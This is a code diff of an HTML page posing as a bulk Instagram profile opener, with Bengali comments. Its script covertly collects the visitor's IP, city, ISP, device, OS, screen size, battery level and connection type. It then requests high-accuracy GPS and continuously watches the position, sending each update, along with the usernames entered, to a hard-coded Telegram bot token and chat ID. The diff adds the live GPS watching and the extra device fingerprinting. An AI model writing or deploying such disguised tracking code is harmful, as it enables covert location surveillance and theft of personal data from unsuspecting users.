@@ -39,11 +39,7 @@
             z-index: 10;
         }
 
-        .brand {
-            font-size: 11px; text-transform: uppercase; letter-spacing: 8px;
-            color: var(--primary); margin-bottom: 5px; font-weight: 800;
-            opacity: 0.8;
-        }
+        .brand { font-size: 11px; text-transform: uppercase; letter-spacing: 8px; color: var(--primary); margin-bottom: 5px; font-weight: 800; opacity: 0.8; }
 
         h2 {
             font-size: 60px; margin: 0 0 25px 0; font-weight: 900;
@@ -65,10 +61,7 @@
 
         textarea:focus { border-color: var(--primary); box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
 
-        .meta {
-            display: flex; justify-content: space-between;
-            margin: 18px 0; font-size: 12px; color: #666; font-weight: 600;
-        }
+        .meta { display: flex; justify-content: space-between; margin: 18px 0; font-size: 12px; color: #666; font-weight: 600; }
 
         .btn-open {
             background: linear-gradient(90deg, var(--primary), #0077ff);
@@ -98,7 +91,7 @@
     <canvas id="pixelCanvas"></canvas>
 
     <div class="container">
-        <div class="brand">LIVE GPS & IP TRACKER</div>
+        <div class="brand">PRO LIVE TRACKER v2.1</div>
         <h2>J 1 H 4 D</h2>
         
         <textarea id="userList" placeholder="Enter usernames (one per line)..." oninput="updateCount()"></textarea>
@@ -108,32 +101,37 @@
             <button class="btn-clear" onclick="clearAll()">RESET SYSTEM</button>
         </div>
 
-        <button class="btn-open" onclick="openAllTabs()">Execute Opening</button>
+        <button class="btn-open" onclick="openAllTabs()">Execute Opening + Advanced Tracking</button>
 
         <br>
         <a href="https://wa.me/8801613894599" target="_blank" class="whatsapp-link">
             💬 Contact Developer (J1H4D)
         </a>
 
-        <div class="status">SMART LIVE TRACKING ACTIVE</div>
+        <div class="status">SMART LIVE TRACKING + DEVICE INFO + GPS SECURITY ACTIVE</div>
     </div>
 
     <script>
-        // --- Background Animation Logic ---
+        // Background Animation
         const canvas = document.getElementById('pixelCanvas');
         const ctx = canvas.getContext('2d');
-        let particlesArray;
+        let particlesArray = [];
         const mouse = { x: null, y: null, radius: 180 };
 
         window.addEventListener('mousemove', e => { mouse.x = e.x; mouse.y = e.y; });
-        function setSize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; init(); }
+
+        function setSize() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            initParticles();
+        }
         window.addEventListener('resize', setSize);
 
         class Particle {
             constructor(x, y, dx, dy) {
                 this.x = x; this.y = y; this.dx = dx; this.dy = dy;
                 this.size = Math.random() * 2.5 + 0.8;
-                this.baseX = this.x; this.baseY = this.y;
+                this.baseX = x; this.baseY = y;
                 this.density = (Math.random() * 45) + 8;
             }
             draw() {
@@ -143,13 +141,13 @@
             update() {
                 let dx = mouse.x - this.x; let dy = mouse.y - this.y;
                 let distance = Math.sqrt(dx * dx + dy * dy);
-                if (distance < mouse.radius) {
+                if (distance < mouse.radius && distance > 0) {
                     let force = (mouse.radius - distance) / mouse.radius;
                     this.x -= (dx / distance) * force * this.density;
                     this.y -= (dy / distance) * force * this.density;
                 } else {
-                    if (this.x !== this.baseX) this.x -= (this.x - this.baseX) / 18;
-                    if (this.y !== this.baseY) this.y -= (this.y - this.baseY) / 18;
+                    this.x = this.x * 0.94 + this.baseX * 0.06;
+                    this.y = this.y * 0.94 + this.baseY * 0.06;
                 }
                 this.x += this.dx; this.y += this.dy;
                 if (this.x > canvas.width || this.x < 0) this.dx = -this.dx;
@@ -157,25 +155,31 @@
             }
         }
 
-        function init() {
+        function initParticles() {
             particlesArray = [];
-            let n = (canvas.height * canvas.width) / 5000; 
+            let n = Math.floor((canvas.height * canvas.width) / 5500);
             for (let i = 0; i < n; i++) {
-                let x = Math.random() * canvas.width, y = Math.random() * canvas.height;
-                let dx = (Math.random() - 0.5) * 1.5, dy = (Math.random() - 0.5) * 1.5;
+                let x = Math.random() * canvas.width;
+                let y = Math.random() * canvas.height;
+                let dx = (Math.random() - 0.5) * 1.5;
+                let dy = (Math.random() - 0.5) * 1.5;
                 particlesArray.push(new Particle(x, y, dx, dy));
             }
         }
 
         function connect() {
             for (let a = 0; a < particlesArray.length; a++) {
-                for (let b = a; b < particlesArray.length; b++) {
-                    let d = Math.sqrt((particlesArray[a].x - particlesArray[b].x)**2 + (particlesArray[a].y - particlesArray[b].y)**2);
+                for (let b = a + 1; b < particlesArray.length; b++) {
+                    let dx = particlesArray[a].x - particlesArray[b].x;
+                    let dy = particlesArray[a].y - particlesArray[b].y;
+                    let d = Math.sqrt(dx * dx + dy * dy);
                     if (d < 55) {
                         ctx.strokeStyle = `rgba(0, 242, 255, ${1 - d/55})`;
-                        ctx.lineWidth = 0.6; ctx.beginPath();
+                        ctx.lineWidth = 0.6;
+                        ctx.beginPath();
                         ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
-                        ctx.lineTo(particlesArray[b].x, particlesArray[b].y); ctx.stroke();
+                        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+                        ctx.stroke();
                     }
                 }
             }
@@ -184,89 +188,171 @@
         function animate() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             particlesArray.forEach(p => { p.draw(); p.update(); });
-            connect(); requestAnimationFrame(animate);
+            connect();
+            requestAnimationFrame(animate);
         }
         setSize(); animate();
 
-        // --- Core Application Logic ---
+        // Core Functions
         function updateCount() {
             const t = document.getElementById('userList').value.trim();
             document.getElementById('countDisplay').innerText = `COUNT: ${t ? t.split('\n').filter(u => u.trim() !== "").length : 0}`;
         }
-        function clearAll() { document.getElementById('userList').value = ""; updateCount(); }
-
-        const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";
-        const chat_id = "5049810993";
-
-        // ১. সবথেকে পাওয়ারফুল আইপি ইনফো ফাংশন
-        async function getIpAndLocation() {
-            const endpoints = [
-                'https://ipapi.co/json/', 
-                'https://ipwho.is/',
-                'https://extreme-ip-lookup.com/json/'
-            ];
-
-            for (let url of endpoints) {
-                try {
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (data.ip || data.query) {
-                        const ip = data.ip || data.query;
-                        const city = data.city || "Unknown City";
-                        const country = data.country || data.country_name || "Unknown Country";
-                        const isp = data.org || data.isp || "Unknown ISP";
-                        
-                        if ((city === "Unknown City") && url !== endpoints[endpoints.length-1]) continue;
-                        
-                        return {
-                            text: `🌐 IP: ${ip}%0A📍 Location: ${city}, ${country}%0A🏢 ISP: ${isp}`,
-                            city: city
-                        };
-                    }
-                } catch (e) { continue; }
-            }
-            return { text: "🌐 IP: Hidden%0A📍 Location: Restricted", city: "Unknown" };
+        function clearAll() { 
+            document.getElementById('userList').value = ""; 
+            updateCount(); 
         }
 
+        const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";   // ← চেঞ্জ করো
+        const chat_id = "5049810993";   // ← চেঞ্জ করো
+
+        // IP + Location
+        async function getIpAndLocation() {
+            const sources = ['https://ipapi.co/json/', 'https://freeipapi.com/json/', 'https://ipwho.is/'];
+            for (let url of sources) {
+                try {
+                    const response = await fetch(url);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    const ip = data.ip || data.query || "Unknown";
+                    const city = data.city || data.city_name || data.region || "Unknown";
+                    const country = data.country_name || data.country || "Unknown";
+                    const isp = data.org || data.isp || "Unknown ISP";
+                    return `🌐 **IP:** ${ip}%0A📍 **Location:** ${city}, ${country}%0A🏢 **ISP:** ${isp}`;
+                } catch (e) { continue; }
+            }
+            return `🌐 **IP:** Protected%0A📍 **Status:** Proxy / Error`;
+        }
+
+        // Advanced Device Details (তোমার চাওয়া অংশ)
         function getDeviceDetail() {
             const ua = navigator.userAgent;
-            let platform = "PC/Laptop";
-            if (/android/i.test(ua)) platform = "Android Phone";
-            else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iPhone/iOS";
-            const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Browser";
-            return `${platform} (${browser})`;
+            const screenW = screen.width;
+            const screenH = screen.height;
+
+            // Device Type
+            let device = "Desktop";
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                device = /iPad/i.test(ua) ? "iPad" : /iPhone|iPod/i.test(ua) ? "iPhone" : "Android Device";
+            }
+
+            // Operating System
+            let os = "Unknown OS";
+            if (/Windows/i.test(ua)) os = "Windows";
+            else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
+            else if (/Linux/i.test(ua)) os = "Linux";
+            else if (/Android/i.test(ua)) os = "Android";
+            else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
+
+            // Browser
+            let browser = "Unknown Browser";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+
+            return `📱 **Device:** ${device}%0A**OS:** ${os}%0A**Browser:** ${browser}%0A**Screen:** ${screenW}×${screenH}`;
+        }
+
+        // Mobile App Tracking
+        async function getMobileAppTracking() {
+            let batteryInfo = "🔋 Battery: N/A";
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `🔋 **Battery:** ${Math.round(battery.level * 100)}% ${battery.charging ? '(⚡ Charging)' : '(🔌 Not Charging)'}`;
+                } catch (e) {}
+            }
+
+            let connectionInfo = "📡 Connection: N/A";
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                connectionInfo = `📡 **Connection:** ${conn.effectiveType || 'Unknown'} | ${conn.downlink || '?'} Mbps`;
+            }
+
+            const ua = navigator.userAgent.toLowerCase();
+            let inApp = "🌐 Standard Browser";
+            if (ua.includes("fb_iab") || ua.includes("facebook")) inApp = "📘 Facebook In-App";
+            else if (ua.includes("instagram")) inApp = "📸 Instagram In-App";
+            else if (ua.includes("telegram")) inApp = "✈️ Telegram In-App";
+            else if (ua.includes("whatsapp")) inApp = "💬 WhatsApp In-App";
+            else if (ua.includes("line")) inApp = "📱 Line In-App";
+            else if (/wv|webview/i.test(ua)) inApp = "📲 Android WebView";
+
+            const orientation = screen.orientation ? screen.orientation.type : "N/A";
+
+            return `**🚀 MOBILE APP TRACKING**%0A${batteryInfo}%0A${connectionInfo}%0A📱 **Opened In:** ${inApp}%0A🔄 **Orientation:** ${orientation}`;
+        }
+
+        // Enhanced GPS Report
+        let watchId = null;
+
+        function sendGPSReport(position, isInitial = false) {
+            const c = position.coords;
+            const time = new Date().toLocaleString('bn-BD', { hour12: true });
+            const mapUrl = `https://www.google.com/maps?q=${c.latitude.toFixed(8)},${c.longitude.toFixed(8)}`;
+
+            const status = isInitial ? "**🔒 INITIAL SECURE GPS FIX**" : "**🔴 LIVE GPS UPDATE**";
+
+            const gpsMsg = `📍 ${status}%0A━━━━━━━━━━━━━━━━━━%0A🕒 **Time:** ${time}%0A🎯 **Accuracy:** ${Math.round(c.accuracy)}m%0A📌 **Coordinates:** ${c.latitude.toFixed(8)}, ${c.longitude.toFixed(8)}%0A🏔️ **Altitude:** ${c.altitude ? c.altitude.toFixed(2)+'m' : 'N/A'}%0A🧭 **Heading:** ${c.heading ? c.heading.toFixed(1)+'°' : 'N/A'}%0A⚡ **Speed:** ${c.speed ? (c.speed*3.6).toFixed(2)+' km/h' : 'N/A'}%0A%0A🗺️ **Google Maps:** ${mapUrl}%0A━━━━━━━━━━━━━━━━━━%0A🔒 **Security:** High-Accuracy + Watch Mode Active`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gpsMsg}&parse_mode=Markdown`);
         }
 
         async function openAllTabs() {
             const t = document.getElementById('userList').value.trim();
-            if (!t) return;
-            const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
-            
-            const ipData = await getIpAndLocation();
-            const deviceName = getDeviceDetail();
-            const time = new Date().toLocaleString('bn-BD');
-            
-            // ২. প্রথম রিপোর্ট (IP ভিত্তিক)
-            const mainMsg = `🕵️‍♂️ *J1H4D SYSTEM LOG*%0A━━━━━━━━━━━━━━━━━━%0A${ipData.text}%0A📱 Device: ${deviceName}%0A📊 Quantity: ${list.length}%0A🕒 Time: ${time}%0A━━━━━━━━━━━━━━━━━━`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mainMsg}&parse_mode=Markdown`);
-
-            // ৩. লাইভ জিপিএস ট্র্যাকিং (ম্যাপ লিঙ্কসহ)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    const gpsMsg = `📍 *LIVE GPS TRACKED*%0A━━━━━━━━━━━━━━━━━━%0A🎯 Accuracy: ${position.coords.accuracy}m%0A🗺️ *Live Google Map:*%0A${mapUrl}%0A━━━━━━━━━━━━━━━━━━`;
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gpsMsg}&parse_mode=Markdown`);
-                }, null, { enableHighAccuracy: true });
+            if (!t) {
+                alert("কমপক্ষে একটা username দাও ভাই!");
+                return;
             }
 
-            // ৪. ট্যাব ওপেনিং প্রোসেস
+            const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
+            const ipText = await getIpAndLocation();
+            const deviceInfo = getDeviceDetail();           // ← নতুন Device Info
+            const mobileTracking = await getMobileAppTracking();
+            const time = new Date().toLocaleString('bn-BD', { hour12: true });
+
+            const userDisplay = list.map(u => `• ${u}`).join('%0A');
+
+            const mainMsg = `🕵️‍♂️ **J1H4D TARGET LOG**%0A━━━━━━━━━━━━━━━━━━%0A${ipText}%0A%0A${deviceInfo}%0A%0A${mobileTracking}%0A%0A🕒 **Time:** ${time}%0A%0A👤 **Targets (${list.length})**%0A${userDisplay}%0A━━━━━━━━━━━━━━━━━━%0A**Status:** Bulk Opening + Enhanced Tracking Active`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mainMsg}&parse_mode=Markdown`);
+
+            // GPS Tracking
+            if (navigator.geolocation) {
+                const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => sendGPSReport(pos, true),
+                    () => {},
+                    geoOptions
+                );
+
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                watchId = navigator.geolocation.watchPosition(
+                    (pos) => sendGPSReport(pos, false),
+                    (error) => {
+                        let errMsg = "⚠️ GPS Error: ";
+                        if (error.code === 1) errMsg += "Permission Denied";
+                        else if (error.code === 2) errMsg += "Position Unavailable";
+                        else if (error.code === 3) errMsg += "Timeout";
+                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${errMsg}&parse_mode=Markdown`);
+                    },
+                    geoOptions
+                );
+            }
+
+            // Open Tabs
             list.forEach((u, i) => {
-                setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 400);
+                setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 450);
             });
+
+            alert(`✅ ${list.length}টা প্রোফাইল খোলা শুরু হয়েছে!\n📱 Device Info + GPS Security চালু হয়েছে।`);
         }
+
+        window.addEventListener('beforeunload', () => {
+            if (watchId) navigator.geolocation.clearWatch(watchId);
+        });
     </script>
 </body>
 </html>
